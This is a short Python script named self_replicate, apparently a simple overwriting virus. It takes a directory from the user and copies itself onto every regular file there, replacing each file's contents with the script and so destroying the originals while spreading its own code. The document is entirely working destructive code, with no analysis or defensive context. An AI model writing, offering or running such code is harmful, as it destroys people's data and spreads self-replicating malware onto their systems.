import os
import shutil

def self_replicate(directory):

    current_script = os.path.abspath(__file__)
    
    
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        
       
        if os.path.isdir(file_path):
            continue
        
        
        if file_path == current_script:
            continue
        
        # Copy the script to the file
        try:
            shutil.copy(current_script, file_path)
            print(f"Copied to: {file_path}")
        except Exception as e:
            print(f"Failed to copy to {file_path}: {e}")

if __name__ == "__main__":
    target_directory = input("Enter the directory to replicate to: ")
    self_replicate(target_directory)
